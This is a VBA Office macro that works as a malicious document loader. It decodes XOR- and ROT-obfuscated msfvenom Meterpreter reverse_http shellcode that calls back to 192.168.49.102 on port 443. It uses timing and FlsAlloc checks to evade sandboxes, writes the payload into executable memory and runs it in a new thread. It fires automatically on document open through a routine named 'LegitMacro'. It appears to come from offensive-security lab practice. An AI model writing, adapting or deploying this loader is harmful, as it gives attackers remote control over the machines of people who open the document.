Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
Sub LegitMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
    
    ' msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.102 LPORT=443 EXITFUNC=thread -f vbapplication
    ' Shellcode encoded with XOR with key 0xfa (250) and ROT2 
    buf = Array(8,20,119,252,252,252,156,117,33,205,42,160,115,170,204,115,170,248,115,170,240,247,79,178,222,115,138,212,205,7,205,60,88,200,157,136,250,216,220,61,55,249,253,63,181,145,23,170,115,170, _
    236,115,186,200,175,253,44,115,188,132,129,60,144,184,253,44,115,180,228,172,115,164,220,253,43,129,53,144,200,181,205,7,115,208,115,253,46,205,60,88,61,55,249,253,63,196,28,145,16,251, _
    137,4,195,137,224,145,28,164,115,164,224,253,43,158,115,248,179,115,164,232,253,43,115,0,115,253,44,117,192,224,224,163,163,157,165,162,173,7,28,164,167,162,115,234,21,124,7,7,7,169, _
    148,150,161,144,252,148,143,149,150,149,176,148,184,143,222,255,7,49,205,35,171,171,171,171,171,20,135,252,252,252,185,151,130,149,152,152,157,215,209,214,204,220,212,149,172,157,160,195,220,187, _
    172,177,220,183,171,220,205,206,167,202,220,152,149,147,161,220,185,157,155,220,183,171,220,164,213,220,189,140,140,152,161,175,161,154,179,149,144,215,206,204,209,214,205,214,205,209,220,212,179,180, _
    176,185,184,216,220,152,149,147,161,220,191,161,155,147,151,213,220,174,161,138,139,149,151,150,215,205,206,214,205,220,185,151,154,149,152,161,215,205,209,193,205,208,196,220,171,157,158,157,138,149, _
    215,206,204,208,214,205,252,148,194,174,133,95,7,49,171,171,146,251,171,171,148,67,253,252,252,20,225,253,252,252,215,148,165,149,146,149,185,149,158,189,145,145,153,149,157,161,181,143,141,152, _
    171,217,143,159,143,205,139,155,172,171,161,180,190,139,189,130,178,208,145,132,171,187,161,159,202,176,181,155,184,177,208,203,157,197,173,138,186,182,158,167,165,209,162,141,176,187,154,151,133,175, _
    191,152,191,130,185,180,207,184,157,132,173,160,162,186,189,202,177,144,202,187,164,193,145,150,179,139,141,217,191,148,206,160,202,183,164,185,153,143,160,152,155,139,158,158,209,206,161,152,180,178, _
    171,139,191,140,209,150,132,155,181,161,154,191,138,204,184,203,140,196,179,182,193,204,217,164,217,181,174,202,160,144,191,165,138,181,185,151,142,150,160,192,143,189,182,154,191,165,174,157,197,252, _
    172,148,175,117,103,62,7,49,117,62,171,148,252,250,148,128,171,171,171,175,171,174,148,19,177,214,195,7,49,110,146,242,167,171,171,171,171,174,148,217,254,228,131,7,49,129,60,145,240,148, _
    116,235,252,252,148,192,12,209,28,7,49,183,145,29,20,179,252,252,252,146,188,148,252,236,252,252,148,252,252,188,252,171,148,164,96,171,33,7,49,107,171,171,117,31,175,148,252,220,252,252, _
    171,174,148,234,110,117,26,7,49,129,60,144,55,115,255,253,59,129,60,145,33,164,59,167,20,135,7,7,7,205,197,202,214,205,206,196,214,208,197,214,205,204,202,252,67,28,233,210,242,148, _
    94,113,73,105,7,49,200,254,136,242,124,3,28,145,1,67,191,235,138,151,146,252,171,7,49)
    
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Decrypt the shellcode (ROT then XOR)
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    LegitMacro
End Sub
Sub AutoOpen()
    LegitMacro
End Sub
